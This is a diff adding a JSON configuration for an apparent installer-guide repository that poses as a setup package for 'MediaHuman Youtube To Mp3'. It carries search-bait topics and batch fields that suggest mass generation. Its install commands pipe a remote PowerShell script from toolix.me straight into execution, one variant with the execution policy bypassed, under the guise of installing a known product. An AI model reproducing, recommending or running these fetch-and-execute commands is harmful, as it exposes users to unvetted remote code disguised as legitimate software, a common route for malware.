@@ -1,0 +1,26 @@
+{
+  "repo": "MediaHuman-Youtube-To-Mp3-Setup",
+  "product": "MediaHuman Youtube To Mp3 Setup",
+  "product_title": "MediaHuman Youtube To Mp3",
+  "kind": "video",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-mediahuman-youtube-to-mp3",
+    "mediahuman-youtube-to-mp3-app",
+    "repository-readme",
+    "install-guide",
+    "desktop-software",
+    "mediahuman-youtube-to-mp3-desktop-tool",
+    "mediahuman-youtube-to-mp3-windows-tool",
+    "mediahuman-youtube-to-mp3",
+    "windows-11",
+    "windows-desktop"
+  ],
+  "site": "toolix.me"
+}
